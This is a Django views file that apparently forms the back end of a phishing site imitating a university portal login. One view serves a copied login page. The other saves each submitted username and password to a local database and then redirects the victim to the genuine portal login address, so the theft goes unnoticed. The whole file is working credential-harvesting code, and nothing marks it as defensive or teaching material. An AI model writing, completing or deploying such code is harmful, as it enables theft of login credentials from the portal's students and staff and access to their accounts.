from django.shortcuts import render, redirect
from django.urls import reverse
from . import forms


# Create your views here.
def login(request):
    return render(request, 'eksuportal/login.html')


def save_credentials(request):
    if request.method == 'POST':
        new_cred = forms.CredentialForm(request.POST)
        if new_cred.is_valid():
            new_cred.save()
            return redirect('https://eksuportal.eksu.edu.ng/login.php')
        else:
            return redirect(reverse('eksuportal:login'))
